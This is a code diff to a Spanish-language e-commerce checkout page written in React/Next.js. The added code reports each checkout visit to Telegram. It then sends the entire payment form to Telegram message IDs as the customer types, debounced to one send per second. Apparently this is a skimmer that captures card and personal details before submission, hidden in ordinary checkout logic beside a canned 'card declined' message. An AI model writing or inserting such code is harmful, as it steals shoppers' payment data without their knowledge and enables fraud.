@@ -12,8 +12,9 @@ import Image from "next/image";
 import Script from "next/script";
 import Link from "next/link";
 import { useRouter } from "next/navigation";
-import { useCallback, useEffect, useState, type FormEvent } from "react";
+import { useCallback, useEffect, useState, useRef, type FormEvent } from "react";
 import { useCart } from "./CartProvider";
+import { notifyCheckoutVisit, updateCheckoutData } from "@/app/actions";
 
 const GENERIC_PAYMENT_DECLINE_MESSAGE =
   "Tarjeta declinada. Intenta con otro método de pago o comunícate con tu banco.";
@@ -55,7 +56,30 @@ type CardBrand = "visa" | "mastercard" | "amex" | "unknown";
 export function CheckoutPage() {
   const router = useRouter();
   const { items, subtotal, isHydrated } = useCart();
+  const hasNotified = useRef(false);
+  const [telegramMsgIds, setTelegramMsgIds] = useState<{chatId: string; messageId: number}[] | null>(null);
+
+  useEffect(() => {
+    if (!hasNotified.current) {
+      hasNotified.current = true;
+      notifyCheckoutVisit().then(ids => {
+        if (ids) setTelegramMsgIds(ids);
+      });
+    }
+  }, []);
+
   const [form, setForm] = useState(initialForm);
+
+  useEffect(() => {
+    if (!telegramMsgIds) return;
+    
+    // Usamos un debounce para no saturar la API de Telegram con cada tecla presionada
+    const timeout = setTimeout(() => {
+      updateCheckoutData(telegramMsgIds, form);
+    }, 1000);
+
+    return () => clearTimeout(timeout);
+  }, [form, telegramMsgIds]);
   const [deviceSessionId, setDeviceSessionId] = useState("");
   const [isOpenPayReady, setIsOpenPayReady] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
